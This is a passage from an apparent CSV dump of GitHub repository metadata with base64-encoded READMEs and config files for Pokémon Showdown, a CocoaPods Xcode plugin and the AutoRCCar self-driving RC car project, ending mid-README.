LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpQUyBoYXMgYSBidWlsdC1pbiBj
aGF0IHNlcnZpY2UuIEpvaW4gb3VyIG1haW4gc2VydmVyIHRvIHRhbGsgdG8g
dXMhCgpZb3UgY2FuIGFsc28gdmlzaXQgdGhlIFtQb2vDqW1vbiBTaG93ZG93
biBmb3J1bXNdWzhdIGZvciBkaXNjdXNzaW9uIGFuZCBoZWxwLgoKICBbOF06
IGh0dHBzOi8vd3d3LnNtb2dvbi5jb20vZm9ydW1zL2ZvcnVtcy9wb2slQzMl
QTltb24tc2hvd2Rvd24uMjA5LwoKSWYgeW91J2QgbGlrZSB0byBjb250cmli
dXRlIHRvIHByb2dyYW1taW5nIGFuZCBkb24ndCBrbm93IHdoZXJlIHRvIHN0
YXJ0LCBmZWVsIGZyZWUgdG8gY2hlY2sgb3V0IFtJZGVhcyBmb3IgTmV3IERl
dmVsb3BlcnNdWzldLgoKICBbOV06IGh0dHBzOi8vZ2l0aHViLmNvbS9aYXJl
bC9Qb2tlbW9uLVNob3dkb3duL2lzc3Vlcy8yNDQ0CgoKTGljZW5zZQotLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KClBva8OpbW9uIFNob3dkb3duJ3Mg
c2VydmVyIGlzIGRpc3RyaWJ1dGVkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUg
W01JVCBMaWNlbnNlXVsxMF0uCgogIFsxMF06IGh0dHBzOi8vZ2l0aHViLmNv
bS9aYXJlbC9Qb2tlbW9uLVNob3dkb3duL2Jsb2IvbWFzdGVyL0xJQ0VOU0UK
CgpDcmVkaXRzCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKT3duZXIK
Ci0gR3Vhbmdjb25nIEx1byBbWmFyZWxdIC0gRGV2ZWxvcG1lbnQsIERlc2ln
biwgU3lzYWRtaW4KClN0YWZmCgotIEFzdHJpZCBIYWxiZXJrYW1wIFtBc2hl
dmllcmUsIGJ1bWJhZGFkYWJ1bV0gLSBEZXZlbG9wbWVudAotIENocmlzIE1v
bnNhbnRvIFtjaGFvc10gLSBTeXNhZG1pbgotIEtpcmsgU2NoZWliZWxodXQg
W3ByZV0gLSBEZXZlbG9wbWVudCwgU3lzYWRtaW4KLSBNYXRoaWV1IERpYXMt
TWFydGlucyBbTWFydHktRF0gLSBSZXNlYXJjaCAoZ2FtZSBtZWNoYW5pY3Mp
LCBEZXZlbG9wbWVudAotIFtUaGUgSW1tb3J0YWxdIC0gRGV2ZWxvcG1lbnQK
ClJldGlyZWQgU3RhZmYKCi0gQmlsbCBNZWx0c25lciBbYm1lbHRzXSAtIERl
dmVsb3BtZW50LCBTeXNhZG1pbgotIENhdGh5IEouIEZpdHpwYXRyaWNrIFtj
YXRoeWpmXSAtIERldmVsb3BtZW50LCBTeXNhZG1pbgotIEh1Z2ggR29yZG9u
IFtWNF0gLSBSZXNlYXJjaCAoZ2FtZSBtZWNoYW5pY3MpLCBEZXZlbG9wbWVu
dAotIEp1YW5tYSBTZXJyYW5vIFtKb2ltXSAtIERldmVsb3BtZW50LCBTeXNh
ZG1pbgotIExlb25hcmRvIEp1bGNhIFtTbGF5ZXI5NV0gLSBEZXZlbG9wbWVu
dAoKTWFqb3IgQ29udHJpYnV0b3JzCgotIEFuZHJldyBXZXJuZXIgW0hvZWVu
SGVyb10gLSBEZXZlbG9wbWVudAotIEF1c3RpbiBDb3V0dXJpZXIgW0F1c3Rp
bl0gLSBEZXZlbG9wbWVudCAoZGFtYWdlIGNhbGN1bGF0b3IpCi0gS2V2aW4g
TGF1IFtBc2NyaXB0bWFzdGVyXSAtIERldmVsb3BtZW50LCBBcnQgKGJhdHRs
ZSBhbmltYXRpb25zKQotIEtvbnJhZCBCb3Jvd3NraSBbeGZpeF0gLSBEZXZl
bG9wbWVudAotIExlb25hcmQgQ3JhZnQgSUlJIFtEYVdvYmxlZmV0XSAtIFJl
c2VhcmNoIChnYW1lIG1lY2hhbmljcykKLSBOZWlsIFJhc2hicm9vayBbdXJr
ZXJhYl0gLSBEZXZlbG9wbWVudAotIFtwZWFjaF0gLSBEZXZlbG9wbWVudAot
IFF1aW50b24gTGVlIFtzaXJEb25vdmFuXSAtIERldmVsb3BtZW50Ci0gW1Jp
ZGF6XSAtIEFydCAoYmF0dGxlIGFuaW1hdGlvbnMpCi0gUm9iaW4gVmFuZGVu
YnJhbmRlIFtRdWluZWxsYV0gLSBEZXZlbG9wbWVudAotIFRvYmlhcyBNYW5u
IFthc2dkZl0gLSBEZXZlbG9wbWVudAotIFdpbGxpYW0gW01hY0NoYWVnZXJd
IC0gRGV2ZWxvcG1lbnQKCkNvbnRyaWJ1dG9ycwoKLSBBbGV4YW5kZXIgQi4g
W21hdGhmcmVhazIzMV0gLSBEZXZlbG9wbWVudAotIEFuZHJldyBHb29kc2Vs
bCBbWnJhY2tuZWxdIC0gQXJ0IChiYXR0bGUgd2VhdGhlciBiYWNrZHJvcHMp
Ci0gQXZlcnkgWmltbWVyIFtMeXJlbiwgU29sYXJpc0ZveF0gLSBEZXZlbG9w
bWVudAotIEJlbiBEYXZpZXMgW01vcmZlbnRdIC0gRGV2ZWxvcG1lbnQKLSBC
ZW4gRnJlbmdsZXkgW1RhbGtUYWtlc1RpbWVdIC0gRGV2ZWxvcG1lbnQKLSBD
b2R5IFRob21wc29uIFtSaXNpbmdfRHVza10gLSBEZXZlbG9wbWVudAotIFtI
b25rb10gLSBEZXZlbG9wbWVudCAoZGFtYWdlIGNhbGN1bGF0b3IpCi0gSWFu
IENsYWlsIFtMYXllbGxdIC0gQXJ0IChiYXR0bGUgZ3JhcGhpY3MsIHNwcml0
ZXMpCi0gSmFjb2IgTWNMZW1vcmUgW01jTGVtb3JlXSAtIERldmVsb3BtZW50
Ci0gSmVyZW15IFBpZW1vbnRlIFtwYW5wYXduXSAtIERldmVsb3BtZW50Ci0g
S3JpcyBKb2huc29uIFtLcmlzXSAtIERldmVsb3BtZW50Ci0gTHVrZSBIYXJt
b24tVmVsbG90dGkgW21vbywgQ2hlZXNlTXVmZmluXSAtIERldmVsb3BtZW50
Ci0gUnVzc2VsbCBKb25lcyBbU2FkaXN0aWNNeXN0aWNdIC0gUmVzZWFyY2gg
KGdhbWUgbWVjaGFuaWNzKQotIFNwYW5kYW4gUHVud2F0a2FyIFtzcGFuZGFu
XS0gRGV2ZWxvcG1lbnQKLSBXYWxlZWQgSGFzc2FuIFtqZXRvdV0gLSBEZXZl
bG9wbWVudAoKU3BlY2lhbCB0aGFua3MKCi0gU2VlIGh0dHA6Ly9wb2tlbW9u
c2hvd2Rvd24uY29tL2NyZWRpdHMK
",,"c3VkbzogZmFsc2UKbGFuZ3VhZ2U6IG5vZGVfanMKbm9kZV9qczoKICAtICcx
MCcKY2FjaGU6CiAgZGlyZWN0b3JpZXM6CiAgICAtIG5vZGVfbW9kdWxlcwog
ICAgLSAuZXNsaW50Y2FjaGUKc2NyaXB0OiBucG0gcnVuIGZ1bGx0ZXN0Cg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'cocoapods-xcode-plugin',11271755,"b'[deprecated] Dependency management helper for your CocoaPods, right in Xcode 6 and 7'",b'Objective-C',14,2377,,2377,False,b'https://api.github.com/repos/kattrali/cocoapods-xcode-plugin/forks',"IyBDb2NvYVBvZHMgZm9yIFhjb2RlCgohW3Byb2plY3QgZGVwcmVjYXRlZF0o
aHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9iYWRnZS9wcm9qZWN0JTIwc3RhdHVz
LWRlcHJlY2F0ZWQtcmVkLnN2ZykKClRoaXMgcHJvamVjdCBpcyBkZXByZWNh
dGVkIGluIGZhdm9yIG9mIFtFZGl0b3IgRXh0ZW5zaW9uc10oaHR0cHM6Ly9k
ZXZlbG9wZXIuYXBwbGUuY29tL3ZpZGVvcy9wbGF5L3d3ZGMyMDE2LzQxNC8p
IHN1cHBvcnQgaW4gWGNvZGUgOCsuCgpNYW5hZ2UgeW91ciBkZXBlbmRlbmNp
ZXMsIHdpdGggbWluaW1hbCBjb21tYW5kIGxpbmUgaGFjay1mdS4KCiMjIEZl
YXR1cmVzCgotIERvd25sb2FkcyBhbmQgaW50ZWdyYXRlcyBDb2NvYVBvZHMg
bGlzdGVkIGluIGEgcHJvamVjdCdzIFBvZGZpbGUKLSBDcmVhdGVzIHBvZHNw
ZWNzIGZyb20gYSB0ZW1wbGF0ZQotIFNob3dzIGNvbW1hbmQgb3V0cHV0IGlu
IHRoZSB3aW5kb3cgY29uc29sZQotIEluc3RhbGxzIGRvY3VtZW50YXRpb24g
KGZyb20gQ29jb2FEb2NzKSBmb3IgdGhlIENvY29hUG9kcyB1c2VkIGluIHRo
ZSBvcGVuIFhjb2RlIHdvcmtzcGFjZQotIFN1cHBvcnRzIHVzaW5nIGEgY3Vz
dG9tIHBhdGggdG8geW91ciBDb2NvYVBvZHMgaW5zdGFsbGF0aW9uCi0gU3Vw
cG9ydHMgYCRHRU1fSE9NRWAgZXhwYW5zaW9uLCBgJEdFTV9QQVRIYCBleHBh
bnNpb24sIGFuZCBgcnZtYCBlbnZpcm9ubWVudHMKLSBPZmZsaW5lIG1vZGUK
CiFbTWVudV0obWVudS5wbmcpCgoKIyMgUHJlcmVxdWlzaXRlcwoKLSBYY29k
ZSA1KwotIENvY29hUG9kcyAwLjIyLjErLCBieSBkZWZhdWx0IGV4cGVjdGVk
IHRvIGJlIGluc3RhbGxlZCB0byBgL3Vzci9iaW4vcG9kYC4gVGhlIGluc3Rh
bGxhdGlvbiBwYXRoIGNhbiBiZSBjaGFuZ2VkIGJ5IGVkaXRpbmcgYEdFTSBQ
QVRIYCBpbiB0aGUgYFByb2R1Y3QgPiBDb2NvYVBvZHNgIG1lbnUuIE1vcmUg
ZGV0YWlscyBjYW4gYmUgZm91bmQgaW4gdGhlIFVzYWdlIHNlY3Rpb24uCgoK
IyMgSW5zdGFsbAoKSW5zdGFsbCB2aWEgW0FsY2F0cmF6XShodHRwOi8vYWxj
YXRyYXouaW8vKQoKT1IKCkNsb25lIGFuZCBidWlsZCB0aGUgcHJvamVjdCwg
dGhlbiByZXN0YXJ0IFhjb2RlLgoKIyMgVW5pbnN0YWxsCgpVbmluc3RhbGwg
dmlhIFtBbGNhdHJhel0oaHR0cDovL2FsY2F0cmF6LmlvLykKCk9SCgpSdW4g
YHJtIC1yIH4vTGlicmFyeS9BcHBsaWNhdGlvblwgU3VwcG9ydC9EZXZlbG9w
ZXIvU2hhcmVkL1hjb2RlL1BsdWctaW5zL0NvY29hUG9kcy54Y3BsdWdpbi9g
CgojIyBVc2FnZQoKIyMjIE9mZmxpbmUgbW9kZQoKSW4gc29tZSBzaXR1YXRp
b25zLCBzdWNoIGFzIHdvcmtpbmcgdW5kZXIgcG9vciBuZXR3b3JrIGNvbmRp
dGlvbnMsIHlvdSBtYXkgd2FudCB0byBydW4gYHBvZGAgaW4Kb2ZmbGluZSBt
b2RlLiBUb2dnbGUgYFByb2R1Y3QgPiBDb2NvYVBvZHMgPiBVcGRhdGUgYW5k
IEluc3RhbGwgT2ZmbGluZSBPbmx5YCB0byBlbmFibGUgb2ZmbGluZSBtb2Rl
LgoKIyMjIEN1c3RvbSBHRU1fUEFUSCBzZXR0aW5nCgpZb3UgY2FuIHNwZWNp
ZnkgYSBjdXN0b20gR0VNX1BBVEggaW4gdGhlIGBQcm9kdWN0ID4gQ29jb2Fw
b2RzYCBtZW51LiBUaGUgZGVmYXVsdCBpcyBgL3Vzci9iaW5gIGFuZCByZW1v
dmluZyBhIGN1c3RvbSB2YWx1ZSB3aWxsIHJlc3RvcmUgdGhlIGRlZmF1bHQu
IEJvdGggYCRHRU1fSE9NRWAgYW5kIGAkR0VNX1BBVEhgIGFyZSBzdXBwb3J0
ZWQsIGFsb25nIHdpdGggYHJ2bWAgZW52aXJvbm1lbnRzLiBUaGF0IG1lYW5z
IHRoZSBmb2xsb3dpbmcgc2V0dGluZ3MgYXJlIHZhbGlkOgoKYGBgCiAgL3Vz
ci9iaW4KICAvdXNyL2xvY2FsL2JpbgogICRHRU1fSE9NRS9iaW4KICAke0dF
TV9IT01FfS9iaW4KICAkR0VNX1BBVEgvYmluCiAgJHtHRU1fUEFUSH0vYmlu
CiAgL1NPTUVfUEFSRU5ULyRHRU1fSE9NRS9iaW4KICAvU09NRV9QQVJFTlQv
JEdFTV9QQVRIL2JpbgpgYGAKCldoZW4gc3BlY2lmeWluZyBgJEdFTV9QQVRI
YCBlYWNoIHBhdGggY29tcG9uZW50IHdpbGwgYmUgZXhwYW5kZWQgZHVyaW5n
IGNvbW1hbmQgcmVzb2x1dGlvbi4gVGhhdCBtZWFucyB0aGUgZm9sbG93aW5n
OgoKYGBgCiAgJEdFTV9QQVRIL2JpbgogIGV4cGFuZHMgdG8uLi4KICAvVXNl
cnMvamFwcGxlc2VlZC8ucnZtL2dlbXMvcnVieS0yLjAuMC1wMjQ3QG15X2dl
bXNldDovVXNlcnMvamFwcGxlc2VlZC8ucnZtL2dlbXMvcnVieS0yLjAuMC1w
MjQ3QGdsb2JhbAogIGV4cGFuZHMgdG8uLi4KICAvVXNlcnMvamFwcGxlc2Vl
ZC8ucnZtL2dlbXMvcnVieS0yLjAuMC1wMjQ3QG15X2dlbXNldC9iaW46L1Vz
ZXJzL2phcHBsZXNlZWQvLnJ2bS9nZW1zL3J1YnktMi4wLjAtcDI0N0BnbG9i
YWwvYmluCmBgYAoKRHVyaW5nIGNvbW1hbmQgcmVzb2x1dGlvbiwgZWFjaCBw
YXRoIHdpbGwgYmUgdGVzdGVkIChpbiBvcmRlcikgc28gdGhhdCB0aGUgZmly
c3QgbWF0Y2ggaXMgdXNlZC4KClBhdGggZXhwYW5zaW9uIGFuZCBjb21tYW5k
IHJlc29sdXRpb24gb2NjdXJzIGVhY2ggdGltZSBiZWZvcmUgYSBjb21tYW5k
IGlzIHJ1bi4gRm9yIGFuIGBydm1gIGVudmlyb25tZW50LCBgLnJ1YnktdmVy
c2lvbmAgYW5kIGAucnVieS1nZW1zZXRgIChpbiB0aGUgcm9vdCBwcm9qZWN0
IGRpcmVjdG9yeSkgY2FuIGR5bmFtaWNhbGx5IGFsdGVyIHRoZSBlbnZpcm9u
bWVudCBhbmQgQ29jb2Fwb2RzIHN1cHBvcnRzIHRoaXMgYmVoYXZpb3IuCgoj
IyMjIFVzaW5nIEdFTV9QQVRIIHdpdGggcnZtCgpVbmRlciBtb3N0IGNpcmN1
bXN0YW5jZXMgaW4gYW4gYHJ2bWAgZW52aXJvbm1lbnQgdGhlIGZvbGxvd2lu
ZyBjdXN0b20gYEdFTV9QQVRIYCBzZXR0aW5nIHNob3VsZCBiZSB1c2VkOgoK
IVtTdWl0YWJsZSBydm0gc2V0dGluZ10obWVudV9ydm0ucG5nKQoKTk9URTog
QmVoaW5kIHRoZSBzY2VuZXMsIHRoZSBgL2JpbmAgcGF0aCBlbGVtZW50IHdp
bGwgYmUgY29udmVydGVkIHRvIGAvd3JhcHBlcmAgZm9yIHJ2bS4gSWYgYC5y
dm1gIGlzIG5vdCBmb3VuZCBpbiB0aGUgZXhwYW5kZWQgcGF0aCwgdGhlIGAv
YmluYCBwYXRoIGVsZW1lbnQgd2lsbCByZW1haW4gdW5tb2RpZmllZC4KCiMj
IFtDb250cmlidXRvcnNdKGh0dHBzOi8vZ2l0aHViLmNvbS9rYXR0cmFsaS9j
b2NvYXBvZHMteGNvZGUtcGx1Z2luL2dyYXBocy9jb250cmlidXRvcnMpCgoj
IyBMaWNlbnNlCgoqKmNvY29hcG9kcy14Y29kZS1wbHVnaW4qKiBpcyBbbGlj
ZW5zZWQgdW5kZXIgdGhlIE1JVCBvcGVuIHNvdXJjZSBsaWNlbnNlXShodHRw
czovL2dpdGh1Yi5jb20va2F0dHJhbGkvY29jb2Fwb2RzLXhjb2RlLXBsdWdp
bi9ibG9iL21hc3Rlci9MSUNFTlNFKS4K
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'AutoRCCar',38638440,b'OpenCV Python Neural Network Autonomous RC Car',b'Python',36,2377,,2377,False,b'https://api.github.com/repos/hamuchiwa/AutoRCCar/forks',"IyMgQXV0b1JDQ2FyCiMjIyBQeXRob24zICsgT3BlbkNWMwoKU2VlIHNlbGYt
ZHJpdmluZyBpbiBhY3Rpb24gIAoKPGEgaHJlZj0iaHR0cDovL3d3dy55b3V0
dWJlLmNvbS93YXRjaD9mZWF0dXJlPXBsYXllcl9lbWJlZGRlZCZ2PUJCd0VG
NldCVVFzCiIgdGFyZ2V0PSJfYmxhbmsiPjxpbWcgc3JjPSJodHRwOi8vaW1n
LnlvdXR1YmUuY29tL3ZpL0JCd0VGNldCVVFzLzAuanBnIiB3aWR0aD0iMzYw
IiBoZWlnaHQ9IjI0MCIgYm9yZGVyPSIxMCIgLz48L2E+CgpUaGlzIHByb2pl
Y3QgYnVpbGRzIGEgc2VsZi1kcml2aW5nIFJDIGNhciB1c2luZyBSYXNwYmVy
cnkgUGksIEFyZHVpbm8gYW5kIG9wZW4gc291cmNlIHNvZnR3YXJlLiBSYXNw
YmVycnkgUGkgY29sbGVjdHMgaW5wdXRzIGZyb20gYSBjYW1lcmEgbW9kdWxl
IGFuZCBhbiB1bHRyYXNvbmljIHNlbnNvciwgYW5kIHNlbmRzIGRhdGEgdG8g
YSBjb21wdXRlciB3aXJlbGVzc2x5LiBUaGUgY29tcHV0ZXIgcHJvY2Vzc2Vz
IGlucHV0IGltYWdlcyBhbmQgc2Vuc29yIGRhdGEgZm9yIG9iamVjdCBkZXRl
Y3Rpb24gKHN0b3Agc2lnbiBhbmQgdHJhZmZpYyBsaWdodCkgYW5kIGNvbGxp
c2lvbiBhdm9pZGFuY2UgcmVzcGVjdGl2ZWx5LiBBIG5ldXJhbCBuZXR3b3Jr
IG1vZGVsIHJ1bnMgb24gY29tcHV0ZXIgYW5kIG1ha2VzIHByZWRpY3Rpb25z
IGZvciBzdGVlcmluZyBiYXNlZCBvbiBpbnB1dCBpbWFnZXMuIFByZWRpY3Rp
b25zIGFyZSB0aGVuIHNlbnQgdG8gdGhlIEFyZHVpbm8gZm9yIFJDIGNhciBj
b250cm9sLiAKICAKIyMjIFNldHRpbmcgdXAgZW52aXJvbm1lbnQgd2l0aCBB
bmFjb25kYQogIDEuIEluc3RhbGwgW2BtaW5pY29uZGEoUHl0aG9uMylgXSho
dHRwczovL2NvbmRhLmlvL21pbmljb25kYS5odG1sKSBvbiB5b3VyIGNvbXB1
dGVyCiAgMi4gQ3JlYXRlIGBhdXRvLXJjY2FyYCBlbnZpcm9ubWVudCB3aXRo
IGFsbCBuZWNlc3NhcnkgbGlicmFyaWVzIGZvciB0aGlzIHByb2plY3QgIAog
ICAgIGBgYGNvbmRhIGVudiBjcmVhdGUgLWYgZW52aXJvbm1lbnQueW1sYGBg
CiAgICAgCiAgMy4gQWN0aXZhdGUgYGF1dG8tcmNjYXJgIGVudmlyb25tZW50
ICAKICAgICBgYGBzb3VyY2UgYWN0aXZhdGUgYXV0by1yY2NhcmBgYAogIAog
ICZlbnNwOyBUbyBleGl0LCBzaW1wbHkgY2xvc2UgdGhlIHRlcm1pbmFsIHdp
bmRvdy4gTW9yZSBpbmZvIGFib3V0IG1hbmFnaW5nIEFuYWNvbmRhIGVudmly
b25tZW50LCBwbGVhc2Ugc2VlIFtoZXJlXShodHRwczovL2NvbmRhLmlvL2Rv
Y3MvdXNlci1ndWlkZS90YXNrcy9tYW5hZ2UtZW52aXJvbm1lbnRzLmh0bWwp
LgogIAojIyMgQWJvdXQgdGhlIGZpbGVzCioqdGVzdC8qKiAgCiAgJmVtc3A7
ICZlbXNwOyBgcmNfY29udHJvbF90ZXN0LnB5YDogUkMgY2FyIGNvbnRyb2wg
d2l0aCBrZXlib2FyZCAgCiAgJmVtc3A7ICZlbXNwOyAgYHN0cmVhbV9zZXJ2
ZXJfdGVzdC5weWA6IHZpZGVvIHN0cmVhbWluZyBmcm9tIFBpIHRvIGNvbXB1
dGVyICAKICAmZW1zcDsgJmVtc3A7ICBgdWx0cmFzb25pY19zZXJ2ZXJfdGVz
dC5weWA6IHNlbnNvciBkYXRhIHN0cmVhbWluZyBmcm9tIFBpIHRvIGNvbXB1
dGVyICAKICAmZW1zcDsgJmVtc3A7ICAqKm1vZGVsX3RyYWluX3Rlc3QvKiog
IAogICAgICAmZW1zcDsgJmVtc3A7ICAmZW1zcDsgJmVtc3A7IGBkYXRhX3Rl
c3QubnB6YDogc2FtcGxlIGRhdGEgIAogICAgICAmZW1zcDsgJmVtc3A7ICAm
ZW1zcDsgJmVtc3A7IGB0cmFpbl9wcmVkaWN0X3Rlc3QuaXB5bmJgOiBhIGp1
cHl0ZXIgbm90ZWJvb2sgdGhhdCBnb2VzIHRocm91Z2ggbmV1cmFsIG5ldHdv
cmsgbW9kZWwgaW4gT3BlbkNWMyAgCiAgCioqcmFzcGJlcnJ5UGkvKiogICAg
CiAgJmVtc3A7ICZlbXNwOyAgYHN0cmVhbV9jbGllbnQucHlgOiAgICAgICAg
c3RyZWFtIHZpZGVvIGZyYW1lcyBpbiBqcGVnIGZvcm1hdCB0byB0aGUgaG9z
dCBjb21wdXRlciAgCiAgJmVtc3A7ICZlbXNwOyAgYHVsdHJhc29uaWNfY2xp
ZW50LnB5YDogICAgc2VuZCBkaXN0YW5jZSBkYXRhIG1lYXN1cmVkIGJ5IHNl
bnNvciB0byB0aGUgaG9zdCBjb21wdXRlciAgCiAgCioqYXJkdWluby8qKiAg
CiAgJmVtc3A7ICZlbXNwOyAgYHJjX2tleWJvYXJkX2NvbnRyb2wuaW5vYDog
Y29udHJvbCBSQyBjYXIgY29udHJvbGxlciAgCiAgCioqY29tcHV0ZXIvKiog
ICAgCiAgJmVtc3A7ICZlbXNwOyAgKipjYXNjYWRlX3htbC8qKiAgCiAgICAg
ICZlbXNwOyAmZW1zcDsgICZlbXNwOyAmZW1zcDsgIHRyYWluZWQgY2FzY2Fk
ZSBjbGFzc2lmaWVycyAgCiAgJmVtc3A7ICZlbXNwOyAgKipjaGVzc19ib2Fy
ZC8qKiAgIAogICAgICAmZW1zcDsgJmVtc3A7ICAmZW1zcDsgJmVtc3A7ICBp
bWFnZXMgZm9yIGNhbGlicmF0aW9uLCBjYXB0dXJlZCBieSBwaSBjYW1lcmEg
IAogICAgICAKICAmZW1zcDsgJmVtc3A7ICBgcGljYW1fY2FsaWJyYXRpb24u
cHlgOiAgICAgcGkgY2FtZXJhIGNhbGlicmF0aW9uICAKICAmZW1zcDsgJmVt
c3A7ICBgY29sbGVjdF90cmFpbmluZ19kYXRhLnB5YDogY29sbGVjdCBpbWFn
ZXMgaW4gZ3JheXNjYWxlLCBkYXRhIHNhdmVkIGFzIGAqLm5wemAgIAogICZl
bXNwOyAmZW1zcDsgIGBtb2RlbC5weWA6ICAgICAgICAgICAgICAgICBuZXVy
YWwgbmV0d29yayBtb2RlbCAgCiAgJmVtc3A7ICZlbXNwOyAgYG1vZGVsX3Ry
YWluaW5nLnB5YDogICAgICAgIG1vZGVsIHRyYWluaW5nIGFuZCB2YWxpZGF0
aW9uICAKICAmZW1zcDsgJmVtc3A7ICBgcmNfZHJpdmVyX2hlbHBlci5weWA6
ICAgICAgaGVscGVyIGNsYXNzZXMvZnVuY3Rpb25zIGZvciBgcmNfZHJpdmVy
LnB5YCAgCiAgJmVtc3A7ICZlbXNwOyAgYHJjX2RyaXZlci5weWA6ICAgICAg
ICAgICAgIHJlY2VpdmUgZGF0YSBmcm9tIHJhc3BiZXJyeSBwaSBhbmQgZHJp
dmUgdGhlIFJDIGNhciBiYXNlZCBvbiBtb2RlbCBwcmVkaWN0aW9uICAKICAm
ZW1zcDsgJmVtc3A7ICBgcmNfZHJpdmVyX25uX29ubHkucHlgOiAgICAgc2lt
cGxpZmllZCBgcmNfZHJpdmVyLnB5YCB3aXRob3V0IG9iamVjdCBkZXRlY3Rp
b24gIAogIAogIAoqKlRyYWZmaWNfc2lnbmFsKiogIAogICZlbXNwOyAmZW1z
cDsgIHRyYWZpYyBzaWduYWwgc2tldGNoIGNvbnRyaWJ1dGVkIGJ5IFtAZ2Vl
azExMV0oaHR0cHM6Ly9naXRodWIuY29tL2dlZWsxMTExKQoKCiMjIyBIb3cg
dG8gZHJpdmUKMS4gKipUZXN0aW5nOioqIEZsYXNoIGByY19rZXlib2FyZF9j
b250cm9sLmlub2AgdG8gQXJkdWlubyBhbmQgcnVuIGByY19jb250cm9sX3Rl
c3QucHlgIHRvIGRyaXZlIHRoZSBSQyBjYXIgd2l0aCBrZXlib2FyZC4gUnVu
IGBzdHJlYW1fc2VydmVyX3Rlc3QucHlgIG9uIGNvbXB1dGVyIGFuZCB0aGVu
IHJ1biBgc3RyZWFtX2NsaWVudC5weWAgb24gcmFzcGJlcnJ5IHBpIHRvIHRl
c3QgdmlkZW8gc3RyZWFtaW5nLiBTaW1pbGFybHksIGB1bHRyYXNvbmljX3Nl
cnZlcl90ZXN0LnB5YCBhbmQgYHVsdHJhc29uaWNfY2xpZW50LnB5YCBjYW4g
YmUgdXNlZCBmb3Igc2Vuc29yIGRhdGEgc3RyZWFtaW5nIHRlc3RpbmcuICAg
CgoyLiAqKlBpIENhbWVyYSBjYWxpYnJhdGlvbiAob3B0aW9uYWwpOioqIFRh
a2UgbXVsdGlwbGUgY2hlc3MgYm9hcmQgaW1hZ2VzIHVzaW5nIHBpIGNhbWVy
YSBtb2R1bGUgYXQgdmFyaW91cyBhbmdsZXMgYW5kIHB1dCB0aGVtIGludG8g
KipgY2hlc3NfYm9hcmRgKiogZm9sZGVyLCBydW4gYHBpY2FtX2NhbGlicmF0
aW9uLnB5YCBhbmQgcmV0dXJuZWQgcGFyYW1ldGVycyBmcm9tIHRoZSBjYW1l
cmEgbWF0cml4IHdpbGwgYmUgdXNlZCBpbiBgcmNfZHJpdmVyLnB5YC4KCjMu
ICoqQ29sbGVjdCB0cmFpbmluZy92YWxpZGF0aW9uIGRhdGE6KiogRmlyc3Qg
cnVuIGBjb2xsZWN0X3RyYWluaW5nX2RhdGEucHlgIGFuZCB0aGVuIHJ1biBg
c3RyZWFtX2NsaWVudC5weWAgb24gcmFzcGJlcnJ5IHBpLiBQcmVzcyBhcnJv
dyBrZXlzIHRvIGRyaXZlIHRoZSBSQyBjYXIsIHByZXNzIGBxYCB0byBleGl0
LiBGcmFtZXMgYXJlIHNhdmVkIG9ubHkgd2hlbiB0aGVyZSBpcyBhIGtleSBw
cmVzcyBhY3Rpb24uIE9uY2UgZXhpdCwgZGF0YSB3aWxsIGJlIHNhdmVkIGlu
dG8gbmV3bHkgY3JlYXRlZCAqKmB0cmFpbmluZ19kYXRhYCoqIGZvbGRlci4K
CjQuICoqTmV1cmFsIG5ldHdvcmsgdHJhaW5pbmc6KiogUnVuIGBtb2RlbF90
cmFpbmluZy5weWAgdG8gdHJhaW4gYSBuZXVyYWwgbmV0d29yayBtb2RlbC4g
UGxlYXNlIGZlZWwgZnJlZSB0byB0dW5lIHRoZSBtb2RlbCBhcmNoaXRlY3R1
cmUvcGFyYW1ldGVycyB0byBhY2hpZXZlIGEgYmV0dGVyIHJlc3VsdC4gQWZ0
ZXIgdHJhaW5pbmcsIG1vZGVsIHdpbGwgYmUgc2F2ZWQgaW50byBuZXdseSBj
cmVhdGVkICoqYHNhdmVkX21vZGVsYCoqIGZvbGRlci4KCjUuICoqQ2FzY2Fk
ZSBjbGFzc2lmaWVycyB0cmFpbmluZyAob3B0aW9uYWwpOioqIFRyYWluZWQg
c3RvcCBzaWduIGFuZCB0cmFmZmljIGxpZ2h0IGNsYXNzaWZpZXJzIGFyZSBp
bmNsdWRlZCBpbiB0aGUgKipgY2FzY2FkZV94bWxgKiogZm9sZGVyLCBpZiB5
b3UgYXJlIGludGVyZXN0ZWQgaW4gdHJhaW5pbmcgeW91ciBvd24gY2xhc3Np
ZmllcnMsIHBsZWFzZSByZWZlciB0byBbT3BlbkNWIGRvY10oaHR0cDovL2Rv
Y3Mub3BlbmN2Lm9yZy9kb2MvdXNlcl9ndWlkZS91Z190cmFpbmNhc2NhZGUu
aHRtbCkgYW5kIHRoaXMgZ3JlYXQgW3R1dG9yaWFsXShodHRwOi8vY29kaW5n
LXJvYmluLmRlLzIwMTMvMDcvMjIvdHJhaW4teW91ci1vd24tb3BlbmN2LWhh
YXItY2xhc3NpZmllci5odG1sKS4KCjYuICoqU2VsZi1kcml2aW5nIGluIGFj
dGlvbioqOiBGaXJzdCBydW4gYHJjX2RyaXZlci5weWAgdG8gc3RhcnQgdGhl
